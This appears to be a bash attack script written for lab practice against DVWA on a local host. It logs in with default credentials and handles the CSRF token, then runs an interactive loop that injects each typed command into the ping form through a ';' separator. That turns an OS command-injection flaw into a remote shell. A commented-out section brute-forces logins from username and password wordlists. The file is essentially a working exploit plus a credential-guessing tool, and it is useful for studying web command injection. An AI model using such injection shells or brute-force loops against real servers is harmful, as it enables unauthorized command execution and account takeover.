#!/bin/bash

# Login


USER="admin"
PASSWD="password"
LOGIN="http://oscp.local/dvwa/login.php"

TOKEN="$(curl -s -c cookie  $LOGIN | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"
echo "${TOKEN}"
curl -s -b cookie -d "username=${USER}&password=${PASSWD}&user_token=${TOKEN}&Login=Login" "${LOGIN}" > /dev/null
if [[ "$?" -eq 0 ]]; then
    echo "Logon"
fi

URL="http://oscp.local/dvwa/vulnerabilities/exec/"


    # <form name="ping" action="#" method="post">
    #     <p> Enter an IP address:
    #         <input type="text" name="ip" size="30">
    #         <input type="submit" name="Submit" value="Submit">
    #     </p>
    # </form>
# test
# curl -s -b cookie --data-urlencode "ip=|id" --data-urlencode "Submit=Submit" ${URL} | sed -n "/<pre>/,/<\/pre>/p" |  sed 's/^[[:space:]][[:space:]]*//g' | sed 's/^<pre>//'  | sed '$d'
# exit 0

while [[ true ]]; do
    read line
    if [[ "$line" == 'exit' ]]; then
        break
    else
        echo "exec : $line"
        curl -s -b cookie --data-urlencode "ip=;${line}" --data-urlencode "Submit=Submit" ${URL} | sed -n "/<pre>/,/<\/pre>/p" |  sed 's/^[[:space:]][[:space:]]*//g' | sed 's/^<pre>//'  | sed '$d'

    fi
done < "/proc/${$}/fd/0"




# FAILED="Username and/or password incorrect."


# ## Password loop
# while read -r _PASS; do
#     ## Username loop
#     while read -r _USER; do
#         TOKEN="$(curl -s -b cookie  ${URL} | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"
#         # curl -b cookie  ${URL}
#         # echo "${URL}"
#         # break 2
#         curl -s  -b "security=low" -b cookie  "${URL}?username=${_USER}&password=${_PASS}&user_token=${TOKEN}&Login=Login" | grep -q "${FAILED}"
#         if [[ "$?" -eq 1 ]]; then
#             echo "Username : ${_USER}"
#             echo "Password : ${_PASS}"
#             break 2
#         else
#             echo "${_USER}: ${_PASS}"
#         fi

#     done < users.txt
# done < passwords.txt
